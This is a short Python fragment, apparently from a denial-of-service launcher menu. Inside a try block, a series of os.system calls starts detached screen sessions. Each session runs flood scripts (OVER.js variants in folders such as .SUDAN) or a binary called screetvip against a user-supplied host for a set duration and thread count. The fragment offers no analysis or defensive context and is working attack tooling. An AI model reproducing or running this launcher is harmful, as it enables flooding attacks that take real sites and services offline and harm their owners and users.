...
""")
			...
			try:
				...
				os.system(f'cd .SUDANC && screen -dm node OVER4.js {host} 64 {time}')
				os.system(f'cd .SUDAN && screen -dm node OVER2.js {host} 32 {time}')
				os.system(f'cd .SUDANC && screen -dm node OVER5.js {host} 32 {time}')
				os.system(f'cd .SUDAN && screen -dm node OVER3.js {host} 32 {time}')
				os.system(f'cd .SUDAN6 && screen -dm node OVER6.js {host} 32 {time}')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
				os.system(f'cd /media && screen -dm node OVER.js {host} 64 {time}')
				os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
				os.system(f'cd /media && screen -dm node OVER.js {host} 64 {time}')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system ("clear")
